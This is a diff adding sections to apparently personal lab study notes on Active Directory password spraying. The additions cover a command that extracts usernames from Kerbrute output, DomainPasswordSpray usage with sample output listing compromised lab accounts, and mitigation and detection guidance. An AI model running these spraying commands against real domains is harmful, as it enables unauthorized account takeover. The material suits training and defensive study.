@@ -5,6 +5,8 @@
 - [Enumerating & Retrieving Password Policies](#enumerating--retrieving-password-policies)
 - [Password Spraying – Making a Target User List](#password-spraying--making-a-target-user-list)
 - [Internal Password Spraying – from Linux](#internal-password-spraying--from-linux)
+- [Internal Password Spraying – from Windows](#internal-password-spraying--from-windows)
+
 
 # Overview
 - **Password spraying** is an attack where a few common passwords are tried against many accounts, avoiding account lockouts.
@@ -276,6 +278,13 @@ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 ...
 ```
 
+**Extracting Valid Usernames from Kerbrute Output:**
+After running Kerbrute, you can quickly build a wordlist of valid usernames with:
+```bash
+grep "VALID USERNAME:" kerbrute_output.txt | awk '{print $NF}' | cut -d'@' -f1 >> valid_users.txt
+```
+This command filters Kerbrute's output and appends the usernames (without domain) to `valid_users.txt`.
+
 ---
 
 ## Example: CrackMapExec (Credentialed)
@@ -368,3 +377,65 @@ SMB 172.16.5.25 445 ACADEMY-EA-MS01 [+] ACADEMY-EA-MS01\administrator 88ad09182d
 **Note:**
 - This technique is noisy and not suitable for stealthy assessments.
 - Recommend using Microsoft LAPS to enforce unique local admin passwords per host. 
+
+# Internal Password Spraying – from Windows
+
+## Overview
+- From a domain-joined Windows host, password spraying can be performed using tools like DomainPasswordSpray or Kerbrute.
+- DomainPasswordSpray can auto-enumerate users, check password policy, and avoid lockouts by excluding risky accounts.
+- Useful for on-site, VM, or initial foothold scenarios.
+
+---
+
+## Using DomainPasswordSpray.ps1
+**Example:**
+```powershell
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+**Sample Output:**
+```
+[*] Current domain is compatible with Fine-Grained Password Policy.
+[*] Now creating a list of users to spray...
+[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
+[*] Removing disabled users from list.
+[*] There are 2923 total users found.
+[*] Removing users within 1 attempt of locking out from list.
+[*] Created a userlist containing 2923 users gathered from the current user's domain
+[*] Password spraying has begun with  1  passwords
+[*] Now trying password Welcome1 against 2923 users.
+[*] SUCCESS! User:sgage Password:Welcome1
+[*] SUCCESS! User:tjohnson Password:Welcome1
+```
+- Kerbrute can also be used on Windows for user enumeration and spraying.
+
+---
+
+## Mitigations
+| Technique                        | Description                                                                 |
+|-----------------------------------|-----------------------------------------------------------------------------|
+| Multi-factor Authentication       | Greatly reduces risk; implement for all external portals.                   |
+| Restricting Access                | Limit app access to only necessary users; follow least privilege.           |
+| Reduce Impact of Exploitation     | Use separate admin accounts, segment networks, and limit lateral movement.  |
+| Password Hygiene                  | Educate users, enforce strong passwords, use password filters.              |
+
+- Ensure lockout policy does not enable easy denial of service.
+
+---
+
+## Detection
+- Monitor for many account lockouts or failed logons (Event ID 4625) in a short period.
+- Watch for Event ID 4771 (Kerberos pre-auth failures) for LDAP spraying attempts.
+- Correlate logon failures to trigger alerts.
+- Enable Kerberos logging for deeper insight.
+
+---
+
+## External Password Spraying (Brief)
+- Attackers often target external services (O365, OWA, RDS, VPN, Citrix, custom web apps) using password spraying.
+- Same principles apply: enumerate users, spray common passwords, avoid lockouts.
+
+---
+
+## Next Steps
+- With valid credentials, proceed to credentialed enumeration and lateral movement using additional tools. 
